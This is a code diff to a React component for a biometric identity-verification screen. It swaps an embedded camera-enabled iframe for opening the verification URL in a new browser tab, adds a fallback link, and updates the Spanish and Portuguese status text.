@@ -26,6 +26,11 @@ const CocosV2BiometricScreen = ({ email, fullName, biometricUrl }: CocosV2Biomet
     return () => clearTimeout(t);
   }, [iframeOpen]);
 
+  const handleStartVerification = () => {
+    window.open(biometricUrl, "_blank", "noopener,noreferrer");
+    setIframeOpen(true);
+  };
+
   if (iframeOpen) {
     return (
       <div className={`w-full max-w-[520px] transition-all duration-500 ${visible ? "opacity-100" : "opacity-0"}`}>
@@ -36,17 +41,28 @@ const CocosV2BiometricScreen = ({ email, fullName, biometricUrl }: CocosV2Biomet
         <div className="rounded-2xl bg-white shadow-[0_8px_32px_-8px_rgba(26,63,143,0.12)] border border-[#e8edf5] overflow-hidden">
           <div className="h-1 w-full bg-gradient-to-r from-[#16a34a] via-[#22c55e] to-[#16a34a]" />
 
-          {/* Iframe container */}
-          <div className="w-full" style={{ height: "520px" }}>
-            <iframe
-              src={biometricUrl}
-              className="w-full h-full border-0"
-              allow="camera; microphone"
-              title="Verificación biométrica"
-            />
+          <div className="px-6 py-8 text-center">
+            <div className="flex justify-center mb-4">
+              <div className="relative">
+                <div className="absolute -inset-3 rounded-full bg-blue-100/50 animate-pulse" />
+                <div className="relative flex h-16 w-16 items-center justify-center rounded-full bg-gradient-to-br from-[#1a3f8f] to-[#2563eb] shadow-lg">
+                  <ShieldCheck size={32} className="text-white" strokeWidth={1.8} />
+                </div>
+              </div>
+            </div>
+            <h3 className="text-[17px] font-bold text-[#1a2233] mb-2">Verificación en curso</h3>
+            <p className="text-[13px] text-[#5a6a85] leading-relaxed mb-4 max-w-[320px] mx-auto">
+              Completa la verificación en la pestaña que se abrió. Cuando termines, volvé acá y presioná el botón de abajo.
+            </p>
+
+            <button
+              onClick={() => window.open(biometricUrl, "_blank", "noopener,noreferrer")}
+              className="text-[13px] text-[#1a3f8f] underline underline-offset-2 hover:text-[#2563eb] mb-4 inline-block"
+            >
+              ¿No se abrió? Haz clic acá
+            </button>
           </div>
 
-          {/* Finish button - appears after 3 minutes */}
           <div className="px-6 py-4 border-t border-[#e8edf5]">
             {showFinishBtn ? (
               <button
@@ -59,7 +75,7 @@ const CocosV2BiometricScreen = ({ email, fullName, biometricUrl }: CocosV2Biomet
             ) : (
               <div className="flex items-center justify-center gap-2 text-[13px] text-[#8895aa]">
                 <Clock size={14} className="animate-pulse" />
-                <span>Complete a verificação acima para continuar...</span>
+                <span>Complete a verificação na outra aba...</span>
               </div>
             )}
           </div>
@@ -136,7 +152,7 @@ const CocosV2BiometricScreen = ({ email, fullName, biometricUrl }: CocosV2Biomet
           </div>
 
           <button
-            onClick={() => setIframeOpen(true)}
+            onClick={handleStartVerification}
             className="flex items-center justify-center gap-2 w-full rounded-xl bg-gradient-to-r from-[#1a3f8f] to-[#2563eb] py-3.5 text-[14px] font-bold text-white transition-all hover:from-[#15357a] hover:to-[#1d55d4] active:scale-[0.98] shadow-md shadow-[#1a3f8f]/20"
           >
             Iniciar verificación
